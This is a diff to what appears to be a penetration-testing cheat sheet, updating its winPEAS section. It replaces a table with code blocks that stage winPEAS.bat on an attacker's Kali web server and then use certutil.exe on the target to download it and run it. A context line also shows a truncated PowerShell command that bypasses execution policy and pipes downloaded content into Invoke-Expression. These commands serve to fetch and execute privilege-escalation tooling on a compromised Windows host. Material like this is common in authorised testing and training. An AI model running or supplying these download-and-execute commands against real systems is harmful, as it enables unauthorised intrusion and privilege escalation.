@@ -894,12 +894,20 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (N
 
 ### 8.3. [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
-[Releases](https://github.com/carlospolop/PEASS-ng/releases)
+[Releases](https://github.com/peass-ng/PEASS-ng/releases)
 
-|   |   |
-|---|---|
-|Prepare Kali|`curl -L -o /var/www/html/winPEAS.bat https://github.com/carlospolop/PEASS-ng/releases/download/20230122/winPEAS.bat`|
-|Download and run on target|`certutil.exe /urlcache /f /split http://$KALI/winPEAS.bat %TEMP%\winPEAS.bat && %TEMP%\winPEAS.bat`|
+#### Prepare Kali
+
+```sh
+VERSION=$(curl -sI https://github.com/peass-ng/PEASS-ng/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
+curl -sLo /var/www/html/winPEAS.bat https://github.com/peass-ng/PEASS-ng/releases/download/$VERSION/winPEAS.bat
+```
+
+#### Download and run on target
+
+```cmd
+certutil.exe /urlcache /f /split http://$KALI/winPEAS.bat %TEMP%\winPEAS.bat && %TEMP%\winPEAS.bat
+```
 
 ### 8.4. JuicyPotato
 
